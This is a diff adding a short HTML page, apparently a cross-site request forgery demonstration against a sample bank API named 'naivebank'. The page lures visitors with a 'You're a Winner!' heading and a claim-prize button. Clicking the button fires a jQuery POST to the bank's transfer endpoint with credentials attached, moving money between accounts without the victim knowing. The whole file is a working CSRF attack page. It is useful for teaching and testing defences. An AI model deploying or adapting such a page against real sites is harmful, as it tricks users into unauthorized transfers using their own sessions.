@@ -1,0 +1,25 @@
+<!DOCTYPE html>
+<html>
+    <head>
+    </head>
+    <body>
+<h1>Congratulations! You're a Winner!</h1>
+<button id="claim-prize">Click to claim your prize!</button>
+<script src="https://ajax.aspnetcdn.com/ajax/jQuery/jquery-3.3.1.min.js"></script>
+<script type="text/javascript">
+$(function() {
+  $('#claim-prize').click(function() {
+    $.ajax({
+      type: 'POST',
+      url: 'https://naivebank.azurewebsites.net/api/balances/transfer',
+      data: JSON.stringify({ from_account: 1, to_account: 2, amount: 1}),
+      contentType: 'application/json',
+      xhrFields: {
+        withCredentials: true
+      }
+    });
+  });
+});
+</script>
+</body>
+</html>
